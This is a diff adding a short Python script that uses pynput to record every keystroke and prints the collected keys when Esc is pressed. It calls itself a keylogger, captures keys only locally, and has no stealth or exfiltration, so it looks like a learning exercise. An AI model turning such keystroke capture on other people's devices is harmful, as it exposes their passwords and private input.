@@ -1,0 +1,21 @@
+#pynput must be install in the terminal before usage. "pip install pynput"
+
+import sys
+import pynput
+from pynput import keyboard
+
+keysPressed = []
+
+def pushedDown(key):
+    if key == keyboard.Key.esc:
+        print("Keylogger off")
+        print("Keys pressed:", keysPressed)
+        sys.exit()
+    else:
+        try:
+            keysPressed.append(key.char)
+        except AttributeError:
+            keysPressed.append(f"[{key}]")
+
+with keyboard.Listener(on_press=pushedDown) as keyListener:
+    keyListener.join()
